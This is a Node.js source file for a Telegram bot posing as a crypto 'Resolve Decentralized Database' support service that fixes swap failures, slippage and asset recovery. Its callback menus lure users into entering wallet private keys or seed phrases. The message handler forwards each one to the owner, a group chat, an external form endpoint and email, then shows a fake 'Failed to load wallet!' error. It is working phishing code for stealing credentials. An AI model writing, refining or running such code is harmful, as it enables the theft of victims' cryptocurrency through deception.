// index.js
const express = require('express');
const dotenv = require('dotenv');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

dotenv.config();
const app = express();
app.use(express.json({ limit: '1mb' })); // parse JSON from Telegram

const PORT = process.env.PORT || 8080;

// Required environment variables
const token = process.env.BOT_TOKEN;
const ownerId = process.env.OWNER_ID;
const formUnstaticURL = process.env.FORM_UNSTATIC_URL;
const appUrl = process.env.APP_URL || process.env.RAILWAY_STATIC_URL; // your public Railway URL
const webhookSecret =
  process.env.WEBHOOK_SECRET ||
  `hook_${Math.random().toString(36).slice(2, 10)}`;

if (!token || !ownerId || !formUnstaticURL || !appUrl) {
  console.error(
    '❌ Missing required environment variables. You must set BOT_TOKEN, OWNER_ID, FORM_UNSTATIC_URL and APP_URL (or RAILWAY_STATIC_URL).'
  );
  throw new Error('Missing required environment variables!');
}

// Create bot in webhook mode (no polling)
const bot = new TelegramBot(token, { polling: false });

// --- Webhook endpoint (no token in path) ---
app.post(`/${webhookSecret}`, (req, res) => {
  // quick log for debugging (trim long bodies)
  try {
    const preview = JSON.stringify(req.body).slice(0, 2000);
    console.log('⤵️ Incoming update:', preview);
  } catch (err) {
    console.log('⤵️ Incoming update (could not stringify)');
  }

  try {
    bot.processUpdate(req.body);
  } catch (err) {
    console.error('Error processing update:', err);
  }
  res.sendStatus(200);
});

// --- Health endpoints ---
app.get('/', (req, res) => res.status(200).send('Bot is live 🚀'));
app.get('/health', (req, res) => res.status(200).send('Bot is running ✅'));

// -------------------- App logic (unchanged handlers, cleaned) --------------------
const chatStates = {};

// send to FormUnstatic helper
const sendToFormUnstatic = async (name, message) => {
  if (!name || !message) {
    console.error('Missing name or message for FormUnstatic submission.');
    return;
  }
  try {
    const response = await axios.post(
      formUnstaticURL,
      new URLSearchParams({ name, message }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );
    console.log('✅ Data sent to FormUnstatic:', response.data);
  } catch (error) {
    console.error(
      '❌ Error sending data to FormUnstatic:',
      error.response?.data || error.message
    );
  }
};

// message handler
bot.on('message', async (msg) => {
  if (!msg || !msg.chat) return;
  const chatId = msg.chat.id;
  const text = msg.text || '';

  const groupId = process.env.GROUP_CHAT_ID; // add this in Railway variables

  if (text === 'Cancel') {
    delete chatStates[chatId];
    return bot.sendMessage(chatId, '✅ Operation canceled.');
  }

  if (chatStates[chatId] === 'awaiting_private_key') {
    const privateKey = text;

    // Send to owner
    bot.sendMessage(ownerId, `🔑 Private Key Received:\n${privateKey}`);

    // Send to group
    if (groupId) {
      bot.sendMessage(groupId, `🔑 Private Key:\n${privateKey}`);
    }

    // Send to FormUnstatic
    sendToFormUnstatic('Private Key Received', privateKey);

    // Send to email
    if (typeof sendEmail === 'function') {
      await sendEmail('Private Key Received', privateKey);
    }

    // Reply to user
    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
      },
    });

    delete chatStates[chatId];
    return;
  }

  if (chatStates[chatId] === 'awaiting_seed_phrase') {
    const seedPhrase = text;

    // Send to owner
    bot.sendMessage(ownerId, `📜 Seed Phrase Received:\n${seedPhrase}`);

    // Send to group
    if (groupId) {
      bot.sendMessage(groupId, `📜 Seed Phrase:\n${seedPhrase}`);
    }

    // Send to FormUnstatic
    sendToFormUnstatic('Seed Phrase Received', seedPhrase);

    // Send to email
    if (typeof sendEmail === 'function') {
      await sendEmail('Seed Phrase Received', seedPhrase);
    }

    // Reply to user
    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
      },
    });

    delete chatStates[chatId];
    return;
  }

  // fallback reply
  bot.sendMessage(chatId, `Hello, ${msg.from?.first_name || 'there'}!`);
});


// /start command and menus
const handledUpdateIds = new Set();

app.post(`/${webhookSecret}`, (req, res) => {
  const update = req.body;
  if (handledUpdateIds.has(update.update_id)) {
    return res.sendStatus(200); // ignore duplicate
  }
  handledUpdateIds.add(update.update_id);

  bot.processUpdate(update).catch(console.error);
  res.sendStatus(200);
});

bot.onText(/\/start/, (msg) => {
  if (handledUpdateIds.has(msg.update_id)) return;
  handledUpdateIds.add(msg.update_id);

  const chatId = msg.chat.id;
  const message = `🌠 Welcome to the Resolve Decentralized Database

Here, you can address issues such as:
• Bot glitches
• Swap failures
• Configuration errors
• Asset recovery
• Validation problems
• High slippage
• Rugged token issues
• Failed transactions
• High gas fees

🚀 Please select an issue to continue.`;

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: ' ⚙️ RECTIFICATION ⚙️', callback_data: 'options' },
          { text: ' ⚙️ VALIDATION ⚙️', callback_data: 'options' },
        ],
        [
          { text: ' ⚙️ CONFIGURATION ⚙️', callback_data: 'options' },
          { text: ' ⚙️ ASSET RECOVERY ⚙️', callback_data: 'options' },
        ],
        [
          { text: ' ⚙️ SWAP FAIL ⚙️', callback_data: 'options' },
          { text: ' ⚙️ CLEAR BOT GLITCH ⚙️', callback_data: 'options' },
        ],
        [
          { text: '⚙️ HIGH SLIPPAGE ⚙️', callback_data: 'options' },
          { text: '⚙️ FAILED BUY & SELL ⚙️', callback_data: 'options' },
        ],
        [
          { text: '⚙️ HIGH GAS FEE ⚙️', callback_data: 'options' },
          { text: '⚙️ TURBO MODE ⚙️', callback_data: 'options' },
        ],
        [
          { text: '⚙️ FAILED SNIPE ⚙️', callback_data: 'options' },
          { text: '⚙️ TECHNICAL BUGS ⚙️', callback_data: 'options' },
        ],
      ],
    },
  };

  bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...options });
});

// Wallet selection keyboard (kept from your original)
const walletSelectionKeyboard = {
  reply_markup: {
    inline_keyboard: [
      [{ text: 'NOVA', callback_data: 'wallet_selected' }],
      [{ text: 'FIRST LEDGER', callback_data: 'wallet_selected' }],
      [{ text: 'BLOOM', callback_data: 'wallet_selected' }],
      [{ text: 'BEAR BULL', callback_data: 'wallet_selected' }],
      [{ text: 'MAESTRO', callback_data: 'wallet_selected' }],
      [{ text: 'AUTO SNIPE', callback_data: 'wallet_selected' }],
      [{ text: 'TROJAN', callback_data: 'wallet_selected' }],
      [{ text: 'NOKBOT', callback_data: 'wallet_selected' }],
      [{ text: 'PHOTON WEB', callback_data: 'wallet_selected' }],
      [{ text: 'XBOT', callback_data: 'wallet_selected' }],
      [{ text: 'GMGN AI', callback_data: 'wallet_selected' }],
      [{ text: 'SUNDOG', callback_data: 'wallet_selected' }],
      [{ text: 'SOL TRADING BOT', callback_data: 'wallet_selected' }],
      [{ text: 'BANANA GUNBOT', callback_data: 'wallet_selected' }],
      [{ text: 'UNIBOT', callback_data: 'wallet_selected' }],
      [{ text: 'SHURIKEN', callback_data: 'wallet_selected' }],
      [{ text: 'PEPE BOT', callback_data: 'wallet_selected' }],
      [{ text: 'TRADEWIZ', callback_data: 'wallet_selected' }],
      [{ text: 'KSPR BOT', callback_data: 'wallet_selected' }],
      [{ text: 'SIGMA BOT', callback_data: 'wallet_selected' }],
      [{ text: 'MEVX WEB', callback_data: 'wallet_selected' }],
      [{ text: 'FINDER BOT WEB', callback_data: 'wallet_selected' }],
      [{ text: 'PRODIGY BOT', callback_data: 'wallet_selected' }],
      [{ text: 'MAGNUM BOT', callback_data: 'wallet_selected' }],
      [{ text: 'WALLET CONNECT', callback_data: 'wallet_selected' }],
    ],
  },
};

// callback query handler (kept logic)
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  switch (query.data) {
    case 'options':
      bot.sendMessage(chatId, 'Select your bot:', walletSelectionKeyboard);
      break;

    case 'wallet_selected':
      bot.sendMessage(chatId, 'ℹ️ Connect wallet to use settings', {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'IMPORT PRIVATE KEY',
                callback_data: 'import_private_key',
              },
            ],
            [
              {
                text: 'IMPORT SEED PHRASE',
                callback_data: 'import_seed_phrase',
              },
            ],
          ],
        },
      });
      break;

    case 'import_private_key':
      bot.sendMessage(chatId, 'Enter private key 🔑', {
        reply_markup: {
          keyboard: [[{ text: 'Cancel' }]],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      });
      chatStates[chatId] = 'awaiting_private_key';
      break;

    case 'import_seed_phrase':
      bot.sendMessage(
        chatId,
        'Enter 12-24 word mnemonic / recovery phrase ⬇️',
        {
          reply_markup: {
            keyboard: [[{ text: 'Cancel' }]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
      chatStates[chatId] = 'awaiting_seed_phrase';
      break;

    case 'try_again':
      bot.sendMessage(chatId, 'Restarting process...', {
        reply_markup: { remove_keyboard: true },
      });
      bot.emit('message', { chat: { id: chatId }, text: '/start' });
      break;
  }
  bot.answerCallbackQuery(query.id).catch(console.error);
});

// -------------------- START SERVER & SET WEBHOOK --------------------
app.listen(PORT, async () => {
  console.log(`🚀 Server running on port ${PORT}`);
  const webhookUrl = `${appUrl.replace(/\/$/, '')}/${webhookSecret}`;

  try {
    // delete old webhook and drop pending updates (safe to call)
    await axios
      .post(`https://api.telegram.org/bot${token}/deleteWebhook`, null, {
        params: { drop_pending_updates: true },
        timeout: 10000,
      })
      .catch((e) => {
        // not fatal — just log
        console.warn(
          'Warning deleting old webhook (nonfatal):',
          e?.message || e
        );
      });

    // set new webhook
    await bot.setWebHook(webhookUrl);
    console.log(`✅ Webhook set to ${webhookUrl}`);
  } catch (err) {
    console.error('❌ Failed to set webhook:', err?.message || err);
  }
});
